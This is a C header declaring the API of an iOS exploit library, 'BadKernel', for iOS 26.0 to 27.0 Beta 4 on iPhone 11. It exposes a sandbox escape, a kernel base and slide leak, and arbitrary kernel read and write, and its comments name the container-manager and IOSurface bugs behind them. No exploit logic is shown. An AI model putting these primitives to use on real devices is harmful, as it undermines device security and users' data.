//  BadKernel.h
//  Sandbox escape + kernel R/W primitives for iOS 26.0-27.0
//
//  Combines bad_query container manager exploit with IOSurface
//  physical memory mapping for kernel read/write access.
//
//  Target: iOS 26.0 - 27.0 Beta 4 (A13 / iPhone 11)

#ifndef BadKernel_h
#define BadKernel_h

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>

#ifdef __cplusplus
extern "C" {
#endif

/// Callback type for logging
typedef void (*bk_log_func_t)(const char *message);

/// Initialize the BadKernel exploit. Returns 0 on success.
/// Sets up sandbox escape, kernel leak, and IOSurface primitives.
int BadKernelInit(void);

/// Initialize with custom log callback (optional).
int BadKernelInitWithLog(bk_log_func_t log_func);

/// Cleanup all resources. Call when done.
int BadKernelDeinit(void);

/// Kernel read: reads `len` bytes from kernel address `kaddr` into `out`.
/// Returns 0 on success, negative on failure.
int BadKernelKRead(uint64_t kaddr, void *out, size_t len);

/// Kernel write: writes `len` bytes from `in` to kernel address `kaddr`.
/// Returns 0 on success, negative on failure.
int BadKernelKWrite(uint64_t kaddr, const void *in, size_t len);

/// Read a kernel uint32_t at `kaddr`.
uint32_t BadKernelKRead32(uint64_t kaddr);

/// Read a kernel uint64_t at `kaddr`.
uint64_t BadKernelKRead64(uint64_t kaddr);

/// Write a kernel uint32_t at `kaddr`.
int BadKernelKWrite32(uint64_t kaddr, uint32_t val);

/// Write a kernel uint64_t at `kaddr`.
int BadKernelKWrite64(uint64_t kaddr, uint64_t val);

/// Returns true if exploit initialized successfully with working kread/kwrite.
bool BadKernelIsReady(void);

/// Returns the leaked kernel base address (0 if not available).
uint64_t BadKernelGetBase(void);

/// Returns the kernel ASLR slide.
uint64_t BadKernelGetSlide(void);

/// Sandbox escape a path. Returns handle (>0) on success, negative on failure.
/// Caller must call BadKernelSandboxRelease(handle) when done.
int64_t BadKernelSandboxEscape(const char *path);

/// Release a sandbox extension handle.
void BadKernelSandboxRelease(int64_t handle);

#ifdef __cplusplus
}
#endif

#endif /* BadKernel_h */
